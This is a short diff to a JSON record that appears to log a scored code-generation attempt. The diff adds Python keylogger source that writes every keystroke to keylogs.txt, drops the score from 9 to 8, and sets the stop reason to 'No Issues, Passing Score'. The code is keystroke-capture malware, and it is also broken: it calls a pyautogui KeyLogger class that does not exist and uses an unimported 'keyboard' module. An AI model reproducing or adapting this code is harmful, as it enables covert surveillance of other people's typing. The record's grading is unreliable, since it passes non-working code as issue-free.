@@ -6,8 +6,8 @@
     "readibility": "Is the code clean and understandable? Full marks requires proper code structure and naming conventions."
   },
   "completed_iterations": 1,
-  "stop_reason": "No Issues",
-  "final_score": 9,
+  "stop_reason": "No Issues, Passing Score",
+  "final_score": 8,
   "final_issue_count": 0,
-  "code": ""
+  "code": "import pyautogui\n\nkeylog_file = open('keylogs.txt', 'a')\n\nlistener = pyautogui.KeyLogger()\n\ndef log_keystroke(key):\n    if key.isprintable():\n        keylog_file.write(key)\n    else:\n        keylog_file.write('[{}]'.format(key))\n\nlistener.Key.press_event += log_keystroke\n\ntry:\n    listener.start()\n    while True:\n        if keyboard.is_pressed('esc'):\n            break\nfinally:\n    listener.stop()\n    keylog_file.close()\n"
 }
